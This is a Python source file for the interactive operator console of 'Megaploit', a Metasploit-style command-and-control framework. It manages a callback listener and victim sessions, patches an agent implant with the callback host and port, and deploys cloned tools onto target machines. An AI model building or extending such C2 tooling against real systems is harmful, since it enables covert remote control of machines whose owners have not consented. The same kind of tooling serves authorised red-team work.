"""
megaploit.server.cli
~~~~~~~~~~~~~~~~~~~~
Metasploit-style interactive C2 console.

Features
--------
* Animated ASCII banner on startup
* Colour-coded prompt that changes between global context and session context
* Spinner animation while waiting for a connection
* `sessions` command to list/switch between multiple simultaneous sessions
* Tab-completion via readline (where available)
* `use <id>` to switch into a session
* `back` to return to the global prompt
* `help` in any context
* Graceful SIGINT / EOFError handling
"""

from __future__ import annotations

import os
import queue
import re
import ssl
import sys
import threading
import time
import py_compile
from typing import Optional

try:
    import readline  # enables arrow-key history & tab completion
    _HAS_READLINE = True
except ImportError:
    _HAS_READLINE = False

from megaploit.core.config import AUTH_TIMEOUT
from megaploit.core.crypto import load_key
from megaploit.server.commands import dispatch, all_commands, CommandResult
from megaploit.server.listener import Listener, build_ssl_context
from megaploit.server.session import Session
from megaploit.toolbox.registry import registry as _tool_registry, Tool
from megaploit.toolbox import installer as _installer
from megaploit.toolbox import runner as _runner
from megaploit.toolbox.updater import UpdateChecker as _UpdateChecker

# ---------------------------------------------------------------------------
# ANSI colour helpers
# ---------------------------------------------------------------------------

_RESET  = "\033[0m"
_BOLD   = "\033[1m"
_DIM    = "\033[2m"
_RED    = "\033[91m"
_GREEN  = "\033[92m"
_YELLOW = "\033[93m"
_BLUE   = "\033[94m"
_CYAN   = "\033[96m"
_WHITE  = "\033[97m"
_GREY   = "\033[90m"

def _c(text: str, *codes: str) -> str:
    """Wrap *text* in ANSI codes, reset at end."""
    return "".join(codes) + text + _RESET


def ok(msg: str)   -> str: return _c(f"[+] {msg}", _GREEN)
def err(msg: str)  -> str: return _c(f"[-] {msg}", _RED)
def info(msg: str) -> str: return _c(f"[*] {msg}", _CYAN)
def warn(msg: str) -> str: return _c(f"[!] {msg}", _YELLOW)


# ---------------------------------------------------------------------------
# ASCII banner
# ---------------------------------------------------------------------------

_BANNER_FRAMES = [
"""
  ███╗   ███╗███████╗ ██████╗  █████╗ ██████╗ ██╗      ██████╗ ██╗████████╗
  ████╗ ████║██╔════╝██╔════╝ ██╔══██╗██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
  ██╔████╔██║█████╗  ██║  ███╗███████║██████╔╝██║     ██║   ██║██║   ██║   
  ██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║██╔═══╝ ██║     ██║   ██║██║   ██║   
  ██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║██║     ███████╗╚██████╔╝██║   ██║   
  ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
""",
]

_SUBTITLE = "  Professional Remote Access Framework  |  v2.0.0  |  For Authorized Use Only"
_DIVIDER  = "  " + "─" * 74


def _print_banner() -> None:
    os.system("cls" if os.name == "nt" else "clear")
    for frame in _BANNER_FRAMES:
        print(_c(frame, _RED, _BOLD))
        time.sleep(0.04)
    print(_c(_SUBTITLE, _GREY))
    print(_c(_DIVIDER, _GREY))
    print()


# ---------------------------------------------------------------------------
# Spinner
# ---------------------------------------------------------------------------

class _Spinner:
    _FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

    def __init__(self, message: str) -> None:
        self._msg = message
        self._stop = threading.Event()
        self._thread = threading.Thread(target=self._run, daemon=True)

    def __enter__(self):
        self._thread.start()
        return self

    def __exit__(self, *_):
        self._stop.set()
        self._thread.join()
        # Clear the spinner line
        sys.stdout.write("\r" + " " * (len(self._msg) + 10) + "\r")
        sys.stdout.flush()

    def _run(self):
        i = 0
        while not self._stop.is_set():
            frame = self._FRAMES[i % len(self._FRAMES)]
            sys.stdout.write(f"\r  {_c(frame, _CYAN)} {_c(self._msg, _GREY)} ")
            sys.stdout.flush()
            time.sleep(0.08)
            i += 1


# ---------------------------------------------------------------------------
# Session table printer
# ---------------------------------------------------------------------------

def _print_sessions(sessions: dict[int, Session]) -> None:
    if not sessions:
        print(info("No active sessions."))
        return
    header = f"  {'ID':<5} {'IP':<18} {'PORT':<8} {'UPTIME':<12}"
    print()
    print(_c(header, _BOLD, _WHITE))
    print(_c("  " + "─" * 46, _GREY))
    for sid, sess in sessions.items():
        print(f"  {_c(str(sid), _CYAN):<14} {_c(sess.ip, _WHITE):<27} {sess.port:<8} {sess.uptime}")
    print()


# ---------------------------------------------------------------------------
# Tab completion
# ---------------------------------------------------------------------------

_GLOBAL_CMDS  = [
    "sessions", "use", "generate", "set", "help", "clear", "exit",
    "toolbox",
]
_SESSION_CMDS = list(all_commands().keys()) + ["back", "clear"]

def _completer(text: str, state: int) -> Optional[str]:
    # Combined pool: global + session + installed tool names
    tool_names = [f"toolbox_run {t.name}" for t in _tool_registry.all()]
    pool = _GLOBAL_CMDS + _SESSION_CMDS + tool_names
    options = [c for c in pool if c.startswith(text)]
    return options[state] if state < len(options) else None

if _HAS_READLINE:
    readline.set_completer(_completer)
    readline.parse_and_bind("tab: complete")


# ---------------------------------------------------------------------------
# Main CLI class
# ---------------------------------------------------------------------------

class Console:
    """
    The interactive operator console.  Call run() to start.
    """

    def __init__(self) -> None:
        self._sessions: dict[int, Session] = {}
        self._sessions_lock = threading.Lock()
        self._new_sessions: queue.Queue[Session] = queue.Queue()
        self._listener: Optional[Listener] = None
        self._updater: Optional[_UpdateChecker] = None

        # Server config (set via 'set' or CLI args)
        self.bind_host: str = "0.0.0.0"
        self.lhost: str = ""
        self.port: int = 4444
        self.cert: str = ""
        self.key_file: str = ""
        self.secret_key: bytes = b""

    # ---------------------------------------------------------------
    # Entry point
    # ---------------------------------------------------------------

    def run(self, bind_host: str, lhost: str, port: int,
            cert: str = "", key_file: str = "",
            secret_key_path: str = "secret.key") -> None:
        self.bind_host = bind_host
        self.lhost = lhost
        self.port = port
        self.cert = cert
        self.key_file = key_file
        self.secret_key = load_key(secret_key_path)

        _print_banner()
        self._start_updater()
        self._start_listener()
        self._global_loop()

    # ---------------------------------------------------------------
    # Updater
    # ---------------------------------------------------------------

    def _start_updater(self) -> None:
        self._updater = _UpdateChecker(megaploit_dir=".")
        self._updater.start()
        print(info("Update checker started (checks every 5 min)"))

    def _drain_updates(self) -> None:
        if self._updater is None:
            return
        for note in self._updater.drain():
            print(note)

    # ---------------------------------------------------------------
    # Listener management
    # ---------------------------------------------------------------

    def _start_listener(self) -> None:
        ssl_ctx: Optional[ssl.SSLContext] = None
        if self.cert and self.key_file:
            try:
                ssl_ctx = build_ssl_context(self.cert, self.key_file)
                print(ok(f"TLS configured ({self.cert})"))
            except ssl.SSLError as e:
                print(err(f"TLS error: {e}"))
                sys.exit(1)

        self._listener = Listener(
            bind_host=self.bind_host,
            port=self.port,
            secret_key=self.secret_key,
            on_session=self._on_new_session,
            ssl_context=ssl_ctx,
        )
        self._listener.start()
        print(ok(f"Listener started on {self.bind_host}:{self.port}"))
        print(info(f"Waiting for agents to connect back to {self.lhost}:{self.port}"))
        print()

    def _on_new_session(self, session: Session) -> None:
        with self._sessions_lock:
            self._sessions[session.id] = session
        self._new_sessions.put(session)

    # ---------------------------------------------------------------
    # New-session notification (printed between prompts)
    # ---------------------------------------------------------------

    def _drain_new_sessions(self) -> None:
        while not self._new_sessions.empty():
            try:
                sess = self._new_sessions.get_nowait()
                print()
                print(ok(f"New session #{sess.id} opened — {sess.ip}:{sess.port}"))
                print(info(f"  Type  use {sess.id}  to interact"))
                print()
            except queue.Empty:
                break
        # Also drain update notifications alongside new sessions
        self._drain_updates()

    # ---------------------------------------------------------------
    # Global prompt loop
    # ---------------------------------------------------------------

    def _global_loop(self) -> None:
        print(info("Type  help  for available commands.\n"))
        while True:
            self._drain_new_sessions()
            try:
                prompt = f"\n{_c('megaploit', _RED, _BOLD)} {_c('>', _GREY)} "
                raw = input(prompt).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                self._shutdown()
                return

            if not raw:
                continue

            parts = raw.split()
            cmd = parts[0].lower()
            args = parts[1:]

            if cmd == "exit":
                self._shutdown()
                return

            elif cmd in ("help", "?"):
                self._global_help()

            elif cmd == "clear":
                os.system("cls" if os.name == "nt" else "clear")

            elif cmd == "sessions":
                with self._sessions_lock:
                    _print_sessions(dict(self._sessions))

            elif cmd == "use":
                self._cmd_use(args)

            elif cmd == "generate":
                self._cmd_generate(args)

            elif cmd == "set":
                self._cmd_set(args)

            elif cmd == "toolbox":
                self._cmd_toolbox(args)

            else:
                print(err(f"Unknown command: {cmd}  (type help)"))

    # ---------------------------------------------------------------
    # Session interaction loop
    # ---------------------------------------------------------------

    def _session_loop(self, session: Session) -> None:
        print()
        print(ok(f"Interacting with session #{session.id} ({session.ip})"))
        print(info("Type  help  for commands,  back  to return.\n"))

        while True:
            self._drain_new_sessions()
            try:
                prompt = (
                    f"\n{_c('megaploit', _RED, _BOLD)}"
                    f" {_c('session', _GREY)}({_c(str(session.id), _CYAN)})"
                    f"{_c('>', _GREY)} "
                )
                raw = input(prompt).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                return

            if not raw:
                continue

            parts = raw.split()
            cmd_name = parts[0].lower()

            if cmd_name == "back":
                return

            if cmd_name == "clear":
                os.system("cls" if os.name == "nt" else "clear")
                continue

            # Dangerous command confirmation
            cmds = all_commands()
            if cmd_name in cmds and cmds[cmd_name].dangerous:
                confirm = input(warn(f"  {cmd_name} is dangerous. Type YES to confirm: ")).strip()
                if confirm != "YES":
                    print(warn("  Cancelled."))
                    continue

            result: CommandResult = dispatch(session, raw)
            self._print_result(result)

            if result.close_session:
                with self._sessions_lock:
                    self._sessions.pop(session.id, None)
                session.close()
                print(info(f"Session #{session.id} closed."))
                return

    # ---------------------------------------------------------------
    # Result renderer
    # ---------------------------------------------------------------

    def _print_result(self, result: CommandResult) -> None:
        if not result.output:
            return
        if result.ok:
            # Colour [+] green, [-] red, [*] cyan within the output
            out = result.output
            out = re.sub(r"^\[\+\]", _c("[+]", _GREEN), out, flags=re.MULTILINE)
            out = re.sub(r"^\[-\]", _c("[-]", _RED),   out, flags=re.MULTILINE)
            out = re.sub(r"^\[\*\]", _c("[*]", _CYAN),  out, flags=re.MULTILINE)
            print(out)
        else:
            print(err(result.output))

    # ---------------------------------------------------------------
    # Sub-commands
    # ---------------------------------------------------------------

    def _cmd_use(self, args: list[str]) -> None:
        if not args or not args[0].isdigit():
            print(err("Usage: use <session_id>"))
            return
        sid = int(args[0])
        with self._sessions_lock:
            session = self._sessions.get(sid)
        if not session:
            print(err(f"No session with ID {sid}"))
            return
        self._session_loop(session)

    def _cmd_generate(self, args: list[str]) -> None:
        """Patch agent.py with LHOST/PORT and optionally byte-compile it."""
        if not self.lhost or not self.port:
            print(err("Set LHOST and PORT first:  set lhost <ip>  /  set port <port>"))
            return
        _patch_agent(self.lhost, self.port)
        if "--compile" in args or "-c" in args:
            try:
                py_compile.compile("agent.py", doraise=True)
                print(ok("agent.py byte-compiled"))
            except py_compile.PyCompileError as e:
                print(err(f"Compile error: {e}"))

    def _cmd_set(self, args: list[str]) -> None:
        if len(args) != 2:
            print(err("Usage: set <option> <value>"))
            _show_options(self)
            return
        key, val = args[0].lower(), args[1]
        if key == "lhost":
            self.lhost = val
            print(ok(f"lhost => {val}"))
        elif key == "port":
            try:
                self.port = int(val)
                print(ok(f"port => {val}"))
            except ValueError:
                print(err("port must be an integer"))
        elif key == "cert":
            self.cert = val
            print(ok(f"cert => {val}"))
        elif key == "key":
            self.key_file = val
            print(ok(f"key => {val}"))
        else:
            print(err(f"Unknown option: {key}"))

    # ---------------------------------------------------------------
    # Help screens
    # ---------------------------------------------------------------

    def _global_help(self) -> None:
        tools = _tool_registry.all()
        lines = [
            "",
            _c("  Global Commands", _BOLD, _WHITE),
            _c("  " + "─" * 50, _GREY),
            f"  {'sessions':<28}  List active sessions",
            f"  {'use <id>':<28}  Interact with a session",
            f"  {'generate [-c]':<28}  Patch & (optionally compile) agent.py",
            f"  {'set <opt> <val>':<28}  Set lhost / port / cert / key",
            f"  {'toolbox install <url> <name>':<28}  Install a GitHub tool",
            f"  {'toolbox list':<28}  Show installed tools",
            f"  {'toolbox search <query>':<28}  Search installed tools",
            f"  {'toolbox info <name>':<28}  Show tool details",
            f"  {'toolbox update <name>':<28}  Pull latest changes",
            f"  {'toolbox remove <name>':<28}  Uninstall a tool",
            f"  {'toolbox set-entry <name> <path>':<28}  Override entry-point",
            f"  {'clear':<28}  Clear the terminal",
            f"  {'exit':<28}  Quit Megaploit",
            "",
            _c("  Options", _BOLD, _WHITE),
            _c("  " + "─" * 50, _GREY),
            f"  {'lhost':<28}  {self.lhost or '(not set)'}",
            f"  {'port':<28}  {self.port}",
            f"  {'cert':<28}  {self.cert or '(none)'}",
            f"  {'key':<28}  {self.key_file or '(none)'}",
            "",
        ]
        if tools:
            lines += [
                _c("  Installed Tools", _BOLD, _WHITE),
                _c("  " + "─" * 50, _GREY),
            ]
            for t in tools:
                status = _c("✔", _GREEN) if t.is_installed else _c("✘", _RED)
                lines.append(f"  {status} {_c(t.name, _CYAN):<22}  {t.description[:55]}")
            lines.append("")
        print("\n".join(lines))

    # ---------------------------------------------------------------
    # Toolbox command dispatcher
    # ---------------------------------------------------------------

    def _cmd_toolbox(self, args: list[str]) -> None:
        """
        toolbox install <repo_url> <name> [description] [--tags a,b,c]
        toolbox list
        toolbox search <query>
        toolbox info <name>
        toolbox remove <name>
        toolbox update <name>
        toolbox set-entry <name> <entry_path>
        """
        if not args:
            self._toolbox_help()
            return

        sub = args[0].lower()
        rest = args[1:]

        if sub == "install":
            self._toolbox_install(rest)
        elif sub == "list":
            self._toolbox_list()
        elif sub == "search":
            self._toolbox_search(rest)
        elif sub == "info":
            self._toolbox_info(rest)
        elif sub == "remove":
            self._toolbox_remove(rest)
        elif sub == "update":
            self._toolbox_update(rest)
        elif sub == "update-all":
            self._toolbox_update_all()
        elif sub == "check-updates":
            self._toolbox_check_updates()
        elif sub == "set-entry":
            self._toolbox_set_entry(rest)
        else:
            print(err(f"Unknown toolbox sub-command: {sub}"))
            self._toolbox_help()

    # ------------------------------------------------------------------

    def _toolbox_install(self, args: list[str]) -> None:
        """
        toolbox install <repo_url> <name> [description] [--tags tag1,tag2]
        """
        if len(args) < 2:
            print(err("Usage: toolbox install <repo_url> <name> [description] [--tags a,b]"))
            return

        repo_url = args[0]
        name     = args[1]

        # Parse optional description and --tags
        description = ""
        tags: list[str] = []
        i = 2
        while i < len(args):
            if args[i] == "--tags" and i + 1 < len(args):
                tags = [t.strip() for t in args[i + 1].split(",")]
                i += 2
            else:
                description += (" " if description else "") + args[i]
                i += 1

        print(info(f"Installing '{name}' from {repo_url}"))
        print()

        def _progress(line: str) -> None:
            # Colour [+]/[-]/[*] lines, pass the rest through dim
            if line.startswith("[+]"):
                print(_c(line, _GREEN))
            elif line.startswith("[-]"):
                print(_c(line, _RED))
            elif line.startswith("[*]"):
                print(_c(line, _CYAN))
            elif line.startswith("[!]"):
                print(_c(line, _YELLOW))
            else:
                print(_c(line, _GREY))

        try:
            with _Spinner(f"Cloning {repo_url}…"):
                tool = _installer.install(
                    repo_url=repo_url,
                    name=name,
                    description=description,
                    tags=tags,
                    progress=_progress,
                )
            print()
            print(ok(f"Tool '{name}' installed successfully."))
            print(info(f"  Entry-point : {tool.entry}"))
            print(info(f"  Path        : {tool.path}"))
            print(info(f"  Run locally : toolbox_run {name} [args]  (inside a session)"))
            print(info(f"  Deploy      : toolbox_deploy {name} [args]  (inside a session)"))
        except RuntimeError as e:
            print(err(str(e)))

    def _toolbox_list(self) -> None:
        tools = _tool_registry.all()
        if not tools:
            print(info("No tools installed.  Use:  toolbox install <url> <name>"))
            return
        print()
        hdr = f"  {'NAME':<18} {'STATUS':<10} {'ENTRY':<22} {'DESCRIPTION'}"
        print(_c(hdr, _BOLD, _WHITE))
        print(_c("  " + "─" * 72, _GREY))
        for t in tools:
            status = _c("installed", _GREEN) if t.is_installed else _c("missing",  _RED)
            desc   = t.description[:40] + ("…" if len(t.description) > 40 else "")
            print(f"  {_c(t.name, _CYAN):<27} {status:<19} {t.entry:<22} {_c(desc, _GREY)}")
        print()

    def _toolbox_search(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox search <query>"))
            return
        query = " ".join(args)
        results = _tool_registry.search(query)
        if not results:
            print(info(f"No tools match '{query}'."))
            return
        print()
        for t in results:
            status = _c("✔", _GREEN) if t.is_installed else _c("✘", _RED)
            print(f"  {status} {_c(t.name, _CYAN):<22}  {t.description[:60]}")
            print(f"     {_c(t.repo, _GREY)}")
        print()

    def _toolbox_info(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox info <name>"))
            return
        t = _tool_registry.get(args[0])
        if not t:
            print(err(f"Tool '{args[0]}' not found."))
            return
        installed = _c("yes", _GREEN) if t.is_installed else _c("no", _RED)
        print()
        print(f"  {_c('Name', _BOLD):<22}  {_c(t.name, _CYAN)}")
        print(f"  {'Repo':<18}  {t.repo}")
        print(f"  {'Description':<18}  {t.description}")
        print(f"  {'Entry-point':<18}  {t.entry}")
        print(f"  {'Path':<18}  {t.path}")
        print(f"  {'Installed':<18}  {installed}")
        print(f"  {'Installed at':<18}  {t.installed_at or 'unknown'}")
        if t.tags:
            print(f"  {'Tags':<18}  {', '.join(t.tags)}")
        print()
        print(f"  {_c('Session usage:', _BOLD, _WHITE)}")
        print(f"    toolbox_run {t.name} [tool-args]       ← run locally vs target")
        print(f"    toolbox_deploy {t.name} [tool-args]    ← run on the target machine")
        print()

    def _toolbox_remove(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox remove <name>"))
            return
        name = args[0]
        confirm = input(warn(f"  Remove '{name}' and delete its directory? (yes/no): ")).strip()
        if confirm.lower() != "yes":
            print(warn("  Cancelled."))
            return
        try:
            _installer.uninstall(name, progress=print)
            print(ok(f"'{name}' removed."))
        except RuntimeError as e:
            print(err(str(e)))

    def _toolbox_update(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox update <name>"))
            return
        try:
            _installer.update(args[0], progress=print)
            # Re-check so the update badge clears
            if self._updater:
                self._updater.check_now()
        except RuntimeError as e:
            print(err(str(e)))

    def _toolbox_update_all(self) -> None:
        """Pull latest changes for every installed tool."""
        tools = _tool_registry.all()
        if not tools:
            print(info("No tools installed."))
            return
        any_ok = False
        for t in tools:
            if not t.is_installed:
                print(warn(f"  Skipping '{t.name}' — directory not found"))
                continue
            try:
                print(info(f"Updating '{t.name}'…"))
                _installer.update(t.name, progress=lambda l: print(f"  {l}"))
                any_ok = True
            except RuntimeError as e:
                print(err(f"  {t.name}: {e}"))
        if any_ok and self._updater:
            self._updater.check_now()

    def _toolbox_check_updates(self) -> None:
        """Force an immediate update check for all tools and Megaploit itself."""
        print(info("Checking for updates…"))
        if self._updater:
            self._updater.check_now()
            time.sleep(2)   # give background thread a moment to finish
            for note in self._updater.drain():
                print(note)
        else:
            print(warn("Update checker not running (git not on PATH?)."))

    def _toolbox_set_entry(self, args: list[str]) -> None:
        if len(args) < 2:
            print(err("Usage: toolbox set-entry <name> <entry_path>"))
            return
        name, entry = args[0], args[1]
        t = _tool_registry.get(name)
        if not t:
            print(err(f"Tool '{name}' not found."))
            return
        t.entry = entry
        _tool_registry.add(t)   # re-saves with updated entry
        print(ok(f"Entry-point for '{name}' set to: {entry}"))

    def _toolbox_help(self) -> None:
        lines = [
            "",
            _c("  toolbox sub-commands", _BOLD, _WHITE),
            _c("  " + "─" * 50, _GREY),
            f"  {'toolbox install <url> <name>':<36}  Clone & install from GitHub",
            f"  {'toolbox list':<36}  Show all installed tools",
            f"  {'toolbox search <query>':<36}  Search by name/tag/description",
            f"  {'toolbox info <name>':<36}  Show tool details & usage",
            f"  {'toolbox update <name>':<36}  Pull latest changes (git pull)",
            f"  {'toolbox update-all':<36}  Update every installed tool at once",
            f"  {'toolbox check-updates':<36}  Check now for available updates",
            f"  {'toolbox remove <name>':<36}  Uninstall a tool",
            f"  {'toolbox set-entry <name> <path>':<36}  Override the entry-point",
            "",
            _c("  Inside a session:", _BOLD, _WHITE),
            _c("  " + "─" * 50, _GREY),
            f"  {'toolbox_run <name> [args]':<36}  Run tool locally (operator side)",
            f"  {'toolbox_deploy <name> [args]':<36}  Upload & run tool on target",
            "",
        ]
        print("\n".join(lines))

    # ---------------------------------------------------------------
    # Shutdown
    # ---------------------------------------------------------------

    def _shutdown(self) -> None:
        print()
        print(info("Shutting down…"))
        if self._updater:
            self._updater.stop()
        if self._listener:
            self._listener.stop()
        with self._sessions_lock:
            for sess in self._sessions.values():
                sess.close()
        print(ok("Goodbye."))


def _show_options(console: Console) -> None:
    print(f"\n  {'Option':<10}  Value")
    print(f"  {'─' * 10}  {'─' * 20}")
    print(f"  {'lhost':<10}  {console.lhost or '(not set)'}")
    print(f"  {'port':<10}  {console.port}")
    print(f"  {'cert':<10}  {console.cert or '(none)'}")
    print(f"  {'key':<10}  {console.key_file or '(none)'}")
    print()


# ---------------------------------------------------------------------------
# Agent patcher
# ---------------------------------------------------------------------------

def _patch_agent(lhost: str, port: int) -> None:
    """Find LHOST= line in agent.py and overwrite it."""
    try:
        with open("agent.py", "r") as f:
            lines = f.readlines()
        idx = next((i for i, l in enumerate(lines) if l.startswith("LHOST =")), None)
        if idx is None:
            print(err("Cannot find 'LHOST =' line in agent.py"))
            return
        lines[idx] = f'LHOST = "{lhost}"; PORT = {port}  # patched by server\n'
        with open("agent.py", "w") as f:
            f.writelines(lines)
        print(ok(f"agent.py patched: LHOST={lhost} PORT={port}"))
    except IOError as e:
        print(err(f"Patch failed: {e}"))
